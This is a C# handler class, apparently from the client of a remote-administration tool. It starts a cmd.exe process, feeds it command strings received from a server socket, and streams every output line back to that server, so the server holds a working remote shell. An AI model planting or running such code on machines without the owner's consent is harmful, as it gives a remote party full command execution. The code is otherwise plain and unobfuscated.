namespace ClientCore.Handle
{
    using Arrowgene.Services.Network.ManagedConnection.Client;
    using NetworkObjects;
    using System;
    using System.ComponentModel;
    using System.Diagnostics;
    using System.IO;
    using System.Runtime.Remoting.Messaging;
    using System.Threading;

    public class HandleRun : IHandlePacket
    {
        private ClientSocket serverSocket;
        private Process shellProcess;

        public HandleRun()
        {

        }

        public void Handle(object receivedClass, ClientSocket serverSocket)
        {
            this.serverSocket = serverSocket;
            string cmd = receivedClass as string;

            if (!string.IsNullOrEmpty(cmd))
            {
                switch (cmd)
                {
                    case "#init":
                        this.Init();
                        break;
                    case "#close":
                        this.Close();
                        break;
                    case "#kill":
                        this.Kill();
                        break;
                    default:
                        this.Command(cmd);
                        break;
                }
            }
        }

        private void Init()
        {
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.CreateNoWindow = false;
            startInfo.UseShellExecute = false;
            startInfo.WindowStyle = ProcessWindowStyle.Normal;
            startInfo.FileName = "cmd";
            //startInfo.Arguments = args;
            startInfo.RedirectStandardOutput = true;
            startInfo.RedirectStandardError = true;
            startInfo.RedirectStandardInput = true;
            this.shellProcess = Process.Start(startInfo);

            AsyncOutputReader stdOut = new AsyncOutputReader();
            stdOut.ReadCompleted += stdOut_ReadCompleted;
            stdOut.ReadAsync(this.shellProcess.StandardOutput);
        }


        private void Command(string command)
        {
            this.shellProcess.StandardInput.WriteLine(command);
        }

        private void Close()
        {
            this.shellProcess.StandardInput.WriteLine("EXIT");
        }

        private void Kill()
        {
            this.shellProcess.Kill();
        }

        void stdOut_ReadCompleted(object sender, AsyncCompletedEventArgs e)
        {
            string str = (string)e.UserState;
            if (!string.IsNullOrEmpty(str))
            {
                serverSocket.SendObject(PacketId.RUN, str);
            }
        }

        private class AsyncOutputReader
        {
            public event AsyncCompletedEventHandler ReadCompleted;
            private delegate void ReadWorkerDelegate(StreamReader stream);
            private bool readIsRunning = false;
            private readonly object myLock = new object();

            public bool IsBusy
            {
                get { return readIsRunning; }
            }

            public void ReadAsync(StreamReader stream)
            {
                ReadWorkerDelegate worker = new ReadWorkerDelegate(ReadWorker);
                AsyncCallback completedCallback = new AsyncCallback(ReadCompletedCallback);

                lock (myLock)
                {
                    if (readIsRunning)
                        throw new InvalidOperationException("The control is currently busy.");

                    AsyncOperation async = AsyncOperationManager.CreateOperation(null);
                    worker.BeginInvoke(stream, completedCallback, async);
                    readIsRunning = true;
                }
            }

            private void ReadWorker(StreamReader stream)
            {
                string str;
                while ((str = stream.ReadLine()) != null)
                {
                    if (ReadCompleted != null)
                        ReadCompleted(this, new AsyncCompletedEventArgs(null, false, str));
                }

            }

            private void ReadCompletedCallback(IAsyncResult ar)
            {
                ReadWorkerDelegate worker =(ReadWorkerDelegate)((AsyncResult)ar).AsyncDelegate;
                worker.EndInvoke(ar);
                lock (myLock)
                {
                    readIsRunning = false;
                }
            }
        }


    }
}
